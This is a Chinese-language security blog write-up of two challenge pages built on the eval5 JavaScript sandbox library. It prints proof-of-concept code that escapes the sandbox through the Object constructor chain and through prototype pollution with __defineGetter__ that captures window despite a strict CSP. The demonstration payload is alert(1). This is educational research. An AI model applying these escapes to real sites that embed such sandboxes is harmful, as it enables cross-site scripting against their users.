---
title: eval5 前端沙箱逃逸与 CSP Bypass
url: https://blog.xlab.app/p/766bba8a/
source: 明天的乌云
date: 2023-05-27
fetch_date: 2025-10-04T11:39:54.884754
---

# eval5 前端沙箱逃逸与 CSP Bypass

[明天的乌云](/)

透明人博客

* [首页](/)
* [分类](/categories/)
* [归档](/archives/)
* [日报专栏](https://daily.xlab.app/)
* [我的推荐](/links/)
* [友情链接](/friends/)
* [关于](/about/)
* 搜索

* 文章目录
* 站点概览

1. [1. 在线环境](#%E5%9C%A8%E7%BA%BF%E7%8E%AF%E5%A2%83)
2. [2. writeup](#writeup)
   1. [2.1. sandbox2](#sandbox2)
   2. [2.2. sandbox3](#sandbox3)
3. 3. 相关文章

![透明人](/images/logo.png)

透明人

Tmr Blog

[197
日志](/archives/)

[33
分类](/categories/)

[159
标签](/tags/)

0%

链接

* [透明日报](https://daily.xlab.app/ "https://daily.xlab.app")

# eval5 前端沙箱逃逸与 CSP Bypass

发表于
2023-05-26

分类于

[安全](/categories/%E5%AE%89%E5%85%A8/)
，
[前端](/categories/%E5%AE%89%E5%85%A8/%E5%89%8D%E7%AB%AF/)

阅读次数：

本文字数：
2.3k

阅读时长 ≈
2 分钟

沙箱逃逸XSS

前段时间，在某程序中发现了一个有趣的功能，在前端实现了一个沙箱，可以执行一些js代码

翻找定位到 eval5 这个开源库，抽出其中的知识点，设计成题目分享一下

<https://github.com/bplok20010/eval5>

官网也有沙箱例子，屏蔽了window，document等对象

<https://bplok20010.github.io/eval5/examples/sandbox.html>

原站点代码过于奔放，XSS过于简单，以此设计了两个沙箱，real world风格，直接引用了最新版本

代码在 <https://github.com/ttttmr/sandbox>

ps: 可以简单diff出来我的改动

## 在线环境

简单修改版

<https://sandbox.demo.xlab.app/sandbox2.html>

增加CSP：`script-src 'self' 'wasm-unsafe-eval'; object-src 'self'`

<https://sandbox.demo.xlab.app/sandbox3.html>

## writeup

### sandbox2

黑盒可以简单试试得知可以使用`Object`

![](/p/766bba8a/object.png)

联想到nodejs沙箱逃逸，通过访问原型链中的构造函数，poc非常简单

|  |  |
| --- | --- |
| ``` 1 ``` | ``` Object.prototype.constructor.constructor("return eval")()("alert(1)") ``` |

推荐阅读 [NodeJS VM和VM2沙箱逃逸](https://xz.aliyun.com/t/11859)

### sandbox3

由于加了非常严格的CSP，sandbox2的poc会被拦截

`script-src 'self' 'wasm-unsafe-eval'; object-src 'self'`

想要直接绕过这个CSP是不太可能的

仔细研究sandbox2 poc，Object是在沙箱外

![](/p/766bba8a/obj.png)

除了调用原型链中的函数，还可以实现原型链污染，利用原型链污染也能实现XSS，推荐阅读huli大佬的文章，这里不展开讲了

[基於 JS 原型鏈的攻擊手法：Prototype Pollution](https://tech-blog.cymetrics.io/posts/huli/prototype-pollution/)

还有一些常见库可以作为Gadgets

[Prototype Pollution and useful Script Gadgets](https://github.com/BlackFan/client-side-prototype-pollution)

不过这个沙箱中似乎不太好利用

1. 没有可以用于XSS的Sink，比如`innerHTML`
2. 也没有可以用的依赖库作为`gadget`，比如`jQuery`

但在`sandbox.js`中存在一个特殊的变量访问

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 ``` | ``` function main() { 	code.value = ` // eval without window // console is not defined 1+1`;  	startRun(); } ``` |

`code`这个变量没有在js中声明，而是在html中定义，也就是页面中的代码输入框

|  |  |
| --- | --- |
| ``` 1 ``` | ``` <textarea id="code" class="code"> </textarea> ``` |

js中可以直接访问code变量访问在DOM的的元素

这种技术也被用于Dom Clobbering，推荐阅读Zeddy大佬的文章

[使用 Dom Clobbering 扩展 XSS](https://xz.aliyun.com/t/7329)

![](/p/766bba8a/pp.png)

不幸的消息是，这种访问方式会经过原型链

通过污染code变量，可以实现修改代码执行内容

|  |  |
| --- | --- |
| ``` 1 ``` | ``` Object.prototype.code={value:"2+2"} ``` |

现在1+1=4了

![](/p/766bba8a/code.png)

但这有什么用呢，代码输入本来就是可控的

再看原型链中我们还能做什么

`Object.prototype.__defineGetter__()`

> **`__defineGetter__`** 方法可以将一个函数绑定在当前对象的指定属性上，当那个属性的值被读取时，你所绑定的函数就会被调用。
>
> <https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/__defineGetter>\_\_

当code被读取时，`this`其实指向的是`window`，将`this`保存下来试试

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` Object.prototype.__defineGetter__("code",function(){     Object.buf = this     delete Object.prototype["code"]     return this["code"] }) ``` |

![](/p/766bba8a/window.png)
![](/p/766bba8a/alert.png)

总结一下，这个方案需要执行两次，一次注入原型链污染，第二次触发污染并窃取`window`

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 ``` | ``` Object.prototype.__defineGetter__("code", function () {   if (typeof Object.buf == "undefined") {     Object.buf = this;   }   delete Object.prototype["code"];   return this["code"]; }); if (typeof Object.buf != "undefined") {   Object.buf.alert(1); } ``` |

暂时还没有研究出来只需要执行一次的方案

## 相关文章

* [Claude Code Router远程命令执行漏洞](https://blog.xlab.app/p/70dc71dc/)
* [Chrome扩展攻击指南（三）：全局视角](https://blog.xlab.app/p/4db211d3/)
* [Chrome扩展攻击指南（二）：漏洞分析](https://blog.xlab.app/p/4db211d2/)
* [Chrome扩展攻击指南（一）：基础知识](https://blog.xlab.app/p/4db211d1/)
* [让”低成本-高交互-定制化“的蜜罐成为可能](https://blog.xlab.app/p/4f53b9f3/)

欢迎关注我的其它发布渠道

[Twitter](https://twitter.com/tmr11235)

[Telegram](https://t.me/tm_daily)

[RSS](/atom.xml)

[安全](/tags/%E5%AE%89%E5%85%A8/)
 [漏洞](/tags/%E6%BC%8F%E6%B4%9E/)
 [前端](/tags/%E5%89%8D%E7%AB%AF/)
 [XSS](/tags/XSS/)
 [CSP](/tags/CSP/)
 [Prototype Pollution](/tags/Prototype-Pollution/)

[从Office诱饵到鸡肋RCE](/p/8fbece25/ "从Office诱饵到鸡肋RCE")

[VSCode CVE-2023-29338](/p/3cee4c33/ "VSCode CVE-2023-29338")

[地球ICP备42号](https://beian.miit.gov.cn/)

© 2016 –
2025

透明人

站点总字数：
343k

Theme NexT works best with JavaScript enabled